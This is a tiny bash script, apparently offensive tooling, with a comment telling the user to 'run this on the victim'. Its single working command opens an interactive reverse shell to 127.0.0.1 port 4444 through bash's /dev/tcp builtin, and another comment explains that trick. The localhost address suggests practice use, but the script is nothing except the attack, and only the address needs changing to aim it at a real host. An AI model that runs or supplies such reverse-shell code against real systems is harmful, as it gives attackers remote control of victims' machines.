#!/bin/bash
export TTY
# shopt -s nullglob # use for 'for' loops but not for 'ls', 'grep'

# run this on the victim

# bash builtin -- not a real file
# /dev/tcp/127.0.0.1/4444

bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"